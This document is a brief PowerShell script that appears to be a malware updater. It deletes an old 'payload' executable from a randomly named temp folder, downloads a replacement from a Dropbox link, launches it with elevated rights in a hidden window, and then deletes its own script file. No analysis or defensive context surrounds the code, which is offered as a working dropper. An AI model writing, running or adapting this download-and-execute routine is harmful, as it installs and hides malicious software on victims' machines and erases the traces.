#sleep
start-sleep 10

#remove old payload
remove-item wsappa.exe

#change directory
cd $env:temp/sVBXKuz

#download updated payload
Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/2i65z3pifh3g6l3abdkmo/wsappa-1.3.exe?rlkey=2bhr3ngxax326luqhao7e6304&dl=0" -OutFile new_wsappa.exe

#sleep
start-sleep 5

#change name
rename-item new_wsappa.exe wsappa.exe

#sleep
start-sleep 5

#start new payload
Start-Process -FilePath "wsappa.exe" -Verb RunAs -WindowStyle Hidden

#sleep
start-sleep 5

#clean uo
powershell.exe /c Remove-Item $env:temp/sVBXKuz/updater.ps1
